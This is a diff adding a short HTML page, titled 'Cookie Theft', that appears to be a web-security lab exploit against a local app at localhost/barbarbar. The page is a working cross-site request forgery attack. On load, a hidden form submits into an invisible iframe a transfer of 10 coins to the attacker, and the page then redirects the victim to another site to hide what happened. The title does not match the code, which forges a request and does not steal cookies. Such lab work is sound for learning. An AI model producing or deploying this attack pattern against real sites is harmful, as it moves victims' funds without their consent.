@@ -1,0 +1,23 @@
+<html>
+    <head>
+        <title>Cookie Theft</title>
+    </head>
+    <body>
+        <script>
+            function callback() {
+                window.location = "http://yesimparanoid.com/";
+            }
+        </script>
+        
+        <iframe name="fake" onload="callback()"></iframe>
+        <form name="transferform" action="http://localhost/barbarbar/transfer.php" method="POST" target="fake">
+            <input name="coins" type="hidden" value="10" />
+            <input name="recipient" type="hidden" value="you" />
+            <input name="submission" type="hidden" value="Send" />
+        </form>
+        
+        <script>
+            document.transferform.submit();
+        </script>
+    </body>
+</html>
